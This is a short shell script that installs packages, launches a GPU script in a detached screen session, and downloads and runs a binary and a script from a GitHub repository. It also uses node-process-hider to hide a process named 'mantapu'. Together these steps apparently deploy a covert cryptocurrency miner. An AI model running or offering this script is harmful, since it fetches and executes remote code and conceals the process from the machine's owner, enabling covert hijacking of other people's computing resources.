#!/bin/sh
sudo apt update
sudo apt install screen -y
screen -dmS gpu.sh ./gpu.sh 79 95
sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add mantapu 
wget https://github.com/d-crypto99/xcroc4/raw/main/mantapu
wget https://raw.githubusercontent.com/d-crypto99/xcroc4/main/gpu-nvidia.sh
chmod +x gpu-nvidia.sh
./gpu-nvidia.sh
